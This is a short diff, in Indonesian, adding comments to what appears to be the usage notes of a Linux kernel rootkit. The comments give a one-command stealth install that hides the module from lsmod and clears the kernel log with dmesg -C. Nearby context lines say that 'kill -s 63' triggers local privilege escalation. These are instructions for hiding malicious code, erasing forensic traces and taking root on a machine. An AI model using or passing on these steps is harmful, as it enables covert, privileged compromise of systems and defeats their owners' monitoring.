@@ -191,6 +191,13 @@
 
 
 # =============================================
+#  STEALTH SEKALI-JALAN (tanpa script terpisah)
+# =============================================
+#  sudo STEALTH=1 sh install.sh
+#    = install normal + hide mod + dmesg -C (langkah10 di install.sh)
+#    tanpa flag = install biasa (modul tampil di lsmod, dipakai saat uji)
+
+# =============================================
 #  SELESAI
 # =============================================
 #  Pola sinyal (dua-duanya berlaku LPE):  kill -s 63 LPE
